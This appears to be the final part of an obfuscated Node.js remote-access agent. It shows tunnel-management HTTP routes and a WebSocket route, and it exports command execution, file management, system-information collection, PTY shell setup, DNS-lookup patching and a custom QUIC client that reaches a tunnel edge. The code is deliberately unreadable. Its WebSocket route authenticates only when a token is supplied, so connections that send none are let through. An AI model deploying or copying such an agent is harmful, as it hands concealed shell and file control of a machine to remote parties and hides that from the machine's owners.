                'debug': (...m) => a0P['debug'](m['join']('\x20')),
                'info': (...m) => a0P[lb(0xd42)](m['join']('\x20')),
                'warning': (...m) => a0P[lb(0x6df)](m[lb(0x455)]('\x20'))
            }, j = new a0c9(i);
        g['get'](b[lb(0x96f)], (m, n) => {
            const lH = lb, o = j[lH(0x290)]();
            n[lH(0x2a5)]({
                'status': 'ok',
                'count': o['length'],
                'tunnels': o
            });
        }), g[lb(0x8a2)](b[lb(0x96f)], async (m, n) => {
            const lI = lb;
            try {
                const o = b['xCEFF'](a0c8, m[lI(0x341)]);
                let p = o[lI(0x597)];
                (b[lI(0xca6)](p, undefined) || b[lI(0xad5)](p, null) || p === '') && (p = a0a1['PORT']);
                const q = Number(p);
                if (!Number[lI(0x53b)](q) || b[lI(0x630)](q, 0x1) || b[lI(0x62a)](q, 0xffff))
                    return n['status'](0x1a6)['json']({
                        'status': lI(0xaa0),
                        'created': ![],
                        'port': p,
                        'message': lI(0x7d1)
                    });
                const r = await j[lI(0x74a)](q, b[lI(0x7fb)](o[lI(0x24a)], !![]), b['pFKpy'](o[lI(0x2c2)], !![]) || o[lI(0x2c2)] === 0x1 || b['fULIl'](b['iJBMd'](String, o['quic'])[lI(0x426)](), b[lI(0x990)]));
                n[lI(0x2a5)]({
                    'status': 'ok',
                    'created': !![],
                    'tunnel_domain': r[lI(0x4a6)],
                    'port': r['port'],
                    'created_at': r[lI(0x87a)],
                    'transport': r[lI(0xcf7)],
                    'tunnel_status': r[lI(0xaa2)] || b['TSCKQ'],
                    'last_error': r['lastError'] ?? null,
                    'last_error_at': r[lI(0x2fd)] ?? null,
                    'consecutive_failures': r['consecutiveFailures'] || 0x0
                });
            } catch (s) {
                n['status'](s[lI(0xaa2)] || 0x1f4)[lI(0x2a5)]({
                    'status': b[lI(0xb43)],
                    'created': ![],
                    'port': s[lI(0x597)] ?? null,
                    'message': s[lI(0xbe8)]
                });
            }
        }), g[lb(0xcfe)](b['PFKlD'], async (m, n) => {
            const lJ = lb;
            try {
                const o = b['iJBMd'](a0c8, m[lJ(0x341)]), p = o['port'], q = b[lJ(0xb05)](Number, p);
                if (b[lJ(0x49a)](p, undefined) || p === null || b[lJ(0xad5)](p, '') || !Number[lJ(0x53b)](q) || q < 0x1 || b['GKaBg'](q, 0xffff))
                    return n[lJ(0xaa2)](0x1a6)[lJ(0x2a5)]({
                        'status': b[lJ(0xb43)],
                        'deleted': 0x0,
                        'port': b[lJ(0x55f)](p, null),
                        'message': b[lJ(0x28c)]
                    });
                const r = await j[lJ(0xb88)](q, o['tunnel_domain']);
                if (b[lJ(0x247)](r[lJ(0xaa2)], 'ok'))
                    return n[lJ(0x2a5)]({
                        'status': 'ok',
                        'deleted': r[lJ(0x7e7)],
                        'port': q,
                        'tunnels': r[lJ(0xa71)]
                    });
                return n[lJ(0xaa2)](r[lJ(0xaa2)])['json']({
                    'status': b[lJ(0xb43)],
                    'deleted': 0x0,
                    'port': q,
                    'message': r[lJ(0xbe8)]
                });
            } catch (s) {
                n[lJ(0xaa2)](0x1f4)[lJ(0x2a5)]({
                    'status': 'error',
                    'deleted': 0x0,
                    'message': s[lJ(0xbe8)]
                });
            }
        }), a0P[lb(0x3a5)](b[lb(0xb36)]), g['ws'](b['rvGde'], async (m, n) => {
            const lK = lb, o = n['params'][0x0];
            a0P[lK(0x3a5)]('WebSocket\x20request\x20URL:\x20' + n[lK(0xb52)]), a0P[lK(0x3a5)]('Matched\x20Sub-path:\x20' + o);
            const p = n[lK(0x693)][lK(0x568)], q = n[lK(0x693)][lK(0x9ad)], r = b[lK(0xca6)](n['query']['meta'], '1'), s = n[lK(0x693)][lK(0xc5b)] === '1';
            a0P[lK(0x3a5)](lK(0x33d) + p);
            if (!p) {
                a0P[lK(0x3a5)](b[lK(0x2a9)]), m[lK(0x7bc)](0x3f0, b['eVSsN']);
                return;
            }
            if (q) {
                const u = a0a1[lK(0x353)](), v = Buffer[lK(0x1e7)](String(q), b[lK(0x978)]), w = Buffer[lK(0x1e7)](u, 'utf-8'), x = b[lK(0x8c8)](v[lK(0x55c)], w[lK(0x55c)]) && a0k[lK(0x6bc)](v, w);
                if (!x) {
                    a0P[lK(0x6df)](lK(0x60e) + p + lK(0xa3b)), m[lK(0x7bc)](0x3f0, 'Authentication\x20failed:\x20Invalid\x20Token');
                    return;
                }
            }
            const t = new a0cg();
            await t[lK(0xb81)](m, p, q, r, s);
        }), a0P[lb(0x3a5)]('WebSocket\x20route\x20configured'), a0ai['restoreFromStore'](), a0P['debug'](b[lb(0x82d)]);
        const k = g[lb(0xa1f)](a0a1[lb(0x759)], a0a1[lb(0x4e8)], () => {
            const lL = lb;
            a0P[lL(0x3a5)](lL(0x4bd) + a0a1[lL(0x67d)] + '\x20started\x20on\x20' + a0a1[lL(0x4e8)] + ':' + a0a1[lL(0x759)]), a0P[lL(0x3a5)](b[lL(0x5cc)]), (b[lL(0x8c8)](a0a1[lL(0xd88)], '1') || b['LzDMy'](a0a1[lL(0xd88)], '2') && a0ca[lL(0xb82)]()) && a0ca[lL(0x119)](j), b[lL(0x8c8)](process[lL(0x267)], 'linux') && b[lL(0x78a)](typeof Bun, b[lL(0x239)]) && b[lL(0x1ca)](a0O)[lL(0xd7b)](() => {
            });
        });
        process['on'](b[lb(0x496)], () => {
            const lM = lb;
            a0P[lM(0x3a5)](b[lM(0xbc3)]), k[lM(0x7bc)](), process[lM(0x744)](0x0);
        }), a0P['debug'](b[lb(0xb55)]);
    } catch (m) {
        a0P['error'](b[lb(0x420)], m), process[lb(0x744)](0x1);
    }
}
(require[a0cm(0x43a)] === module || require[a0cm(0x43a)]?.['filename']?.[a0cm(0x134)](a0cm(0xdb1))) && a0ci()[a0cm(0xd7b)](a0P[a0cm(0xaa0)]);
module[a0cm(0x9af)] = {
    'main': a0ci,
    'loadCurves': a0ch,
    'Config': a0a1,
    'CryptoManager': a0a9,
    'SystemInfoCollector': a0ac,
    'CommandExecutor': a0ad,
    'FileManager': a0ag,
    'TaskManager': a0ai,
    'TaskStore': a0ah,
    'ArgoTunnelManager': a0c9,
    'argoBackoffSeconds': a0c4,
    'argoTruncateError': a0c5,
    'argoRetryBaseSeconds': a0c2,
    'argoRetryMaxSeconds': a0c3,
    'argoReregisterAfter': a0c0,
    'KModeController': a0ca,
    'ZipArchiver': a0af,
    'TempKeyManager': a0a8,
    'SecureDns': a0a4,
    'installDnsHook': a0a7,
    'patchDnsLookup': a0a6,
    'QuicConnection': a0bR,
    'QuicSession': a0bW,
    'QuicTlsClient': a0bO,
    'QuicKeys': a0by,
    'QuicReader': a0bu,
    'quicInitialKeys': a0bA,
    'quicNextKeys': a0bz,
    'quicWriteVarint': a0br,
    'quicReadVarint': a0bs,
    'quicDecodePacketNumber': a0bH,
    'quicApplyProtection': a0bF,
    'quicRemoveProtection': a0bG,
    'quicEncodeTransportParameters': a0bL,
    'quicDecodeTransportParameters': a0bK,
    'quicEncodeAck': a0bI,
    'quicRangesFromAck': a0bJ,
    'hkdfExpandLabel': a0bx,
    'CapnpBuilder': a0aB,
    'capnpMessages': a0aE,
    'capnpWords': a0aG,
    'capnpStruct': a0aF,
    'capnpText': a0aI,
    'capnpStructList': a0aH,
    'capnpReturnResult': a0aJ,
    'capnpConnectRequest': a0aK,
    'capnpConnectResponse': a0aL,
    'connectEdgeQuic': a0bX,
    'buildQuicRequest': a0bT,
    'verifyEdgeQuicCertificate': a0bP,
    'QUIC_DATA_STREAM_PREAMBLE': a0b4,
    'QUIC_SERVER_NAME': a0bd,
    'QUIC_ALPN': a0bc,
    '__ptySelector': {
        'detectLinuxLibc': a0H,
        'ptyCandidateOrder': a0I,
        'probePtyModule': a0K,
        'ensurePty': a0O,
        'PTY_QWQO_VERSION': a0G,
        'getState': () => ({
            'ready': !!a0C,
            'reason': a0D
        })
    }
};